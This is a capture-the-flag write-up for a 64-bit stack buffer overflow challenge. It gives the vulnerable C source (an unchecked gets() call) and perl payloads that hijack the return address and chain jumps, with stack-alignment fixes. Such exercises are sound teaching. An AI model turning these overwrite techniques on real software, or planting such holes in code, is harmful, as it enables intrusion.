# New Overflow 2

> Okay now lets try mainpulating arguments

Program:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && \
      arg_check1 == 0xBAADCAFE && \
      arg_check2 == 0xCAFEBABE && \
      arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }


  

}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Can you match these numbers?");
  vuln();
  return 0;
}
```

## Solution 1: Abuse `flag`

It looks like they accidentally left the `flag` function in, so we should be
able to abuse it with a simple overflow. First note this is an `x86-64`
executable:

```
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5ea0b50d6714a8e9cc331e140a7964d06fdf092, not strippe
```

Let's find the address of `flag`:

```
$ objdump -dM intel vuln | grep '^[a-e0-9]\+ <flag>'
000000000040084d <flag>:
```

and get the location of the target buffer in `vuln`:

```
$ objdump -dM intel vuln | grep -A 5 '^[a-e0-9]\+ <vuln>'
00000000004008b2 <vuln>:
  4008b2:	55                   	push   rbp
  4008b3:	48 89 e5             	mov    rbp,rsp
  4008b6:	48 83 ec 40          	sub    rsp,0x40
  4008ba:	48 8d 45 c0          	lea    rax,[rbp-0x40]
  4008be:	48 89 c7             	mov    rdi,rax
```

So after writing `0x48` values we should be able to overwrite the return
address to our target:

```
$ perl -e 'print "A" x 0x48 . "\x4d\x08\x40\x00\x00\x00\x00\x00"' | ./vuln
Welcome to 64-bit. Can you match these numbers?
Segmentation fault (core dumped)
```

Well, that wasn't the desired result. Let's see what went wrong:

```
$ gdb ./vuln
(gdb) set disassembly-flavor intel
(gdb) run < <(perl -e 'print "A" x 0x48 . "\x4d\x08\x40\x00\x00\x00\x00\x00"')
<-----SNIP----->
Program received signal SIGSEGV, Segmentation fault.
buffered_vfprintf (s=s@entry=0x7ffff7dd0760 <_IO_2_1_stdout_>, format=format@entry=0x7fffffffe3f8 "test_flag_plz_ignore\n",
    args=args@entry=0x7fffffffe318) at vfprintf.c:2314
2314	vfprintf.c: No such file or directory.
(gdb) x/i $rip
=> 0x7ffff7a426ee <buffered_vfprintf+158>:	movaps XMMWORD PTR [rsp+0x50],xmm0
```

After a quick search online for the `movaps` instruction:

> When the source or destination operand is a memory operand, the operand must
> be aligned on a 16-byte

And noting

```
(gdb) print $rsp+0x50
$1 = (void *) 0x7fffffffbc78
```

Is an address that _is not_ divisible by 16, how did we get here? I found this
[useful response](https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul)
on Stack Overflow, in particular

> The x86-64 System V ABI guarantees 16-byte stack alignment before a call, so
> libc system is allowed to take advantage of that for 16-byte aligned
> loads/stores. If you break the ABI, it's your problem if things crash.

(TODO: find a source to verify this). Assuming this is the case, let's hope
another `ret` instruction can re-align our stack for us. Using the return
address from `win_fn` (`0x40084c`) our payload is now:

```
perl -e 'print "A" x 0x48 . "\x4c\x08\x40\x00\x00\x00\x00\x00" . "\x4d\x08\x40\x00\x00\x00\x00\x00"'
```

Which does the trick

## Solution 2: Actually Using Arguments

Let's try to actually use the `win_fn*` functions. Glancing at `win_fn1`:

```
$ objdump -dM intel vuln | sed -n '/^[a-f0-9]\+ <win_fn1>/,/^$/p'
0000000000400767 <win_fn1>:
  400767:	55                   	push   rbp
  400768:	48 89 e5             	mov    rbp,rsp
  40076b:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
  40076e:	81 7d fc ef be ad de 	cmp    DWORD PTR [rbp-0x4],0xdeadbeef
  400775:	75 07                	jne    40077e <win_fn1+0x17>
  400777:	c6 05 fb 08 20 00 01 	mov    BYTE PTR [rip+0x2008fb],0x1        # 601079 <win1>
  40077e:	90                   	nop
  40077f:	5d                   	pop    rbp
  400780:	c3                   	ret
```

in particular, the instructions:

```
  40076b:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
  40076e:	81 7d fc ef be ad de 	cmp    DWORD PTR [rbp-0x4],0xdeadbeef
```

which correspond to ` if (arg_check == 0xDEADBEEF)`, we see the parameter is
read from a register, and not from the stack. So I guess we can't just push
arguments to the stack and call the functions sequentially. However, each of
`win_fn1` and `win_fn2` simply check their arguments, if the check passes a
flag is set, then they return. Since there's nothing special going on between
when these flags are set and when the function returns, we could just try
jumping to these instructions then to `win_fn`.

From above, we want to jump to `0x400777` to set `win1`, similarly we find for
`win2` we will want to jump to `0x4007b4`. Note that for both these functions
there is a `pop rbp` instruction before `ret`, so we will need to add some
buffering to account for this. Our payload is now:

```
perl -e 'print "A" x 0x48                   # Padding buffer until return address
    . "\x77\x07\x40\x00\x00\x00\x00\x00"    # win1 = 1
    . "A" x 0x8                             # padding for "pop rbp"
    . "\xb4\x07\x40\x00\x00\x00\x00\x00"    # win2 = 1
    . "A" x 0x8                             # padding for "pop rbp"
    . "\xbe\x07\x40\x00\x00\x00\x00\x00"    # address of win_fn
    '
```

Trying this and we again run into the same issue we saw with the previous
solution, so add a extra `ret` instruction to align as required:

```
perl -e 'print "A" x 0x48                   # Padding buffer until return address
    . "\x77\x07\x40\x00\x00\x00\x00\x00"    # win1 = 1
    . "A" x 0x8                             # padding for "pop rbp"
    . "\xb4\x07\x40\x00\x00\x00\x00\x00"    # win2 = 1
    . "A" x 0x8                             # padding for "pop rbp"
    . "\x4c\x08\x40\x00\x00\x00\x00\x00"    # "ret" instruction to align stack
    . "\xbe\x07\x40\x00\x00\x00\x00\x00"    # address of win_fn
    '
```
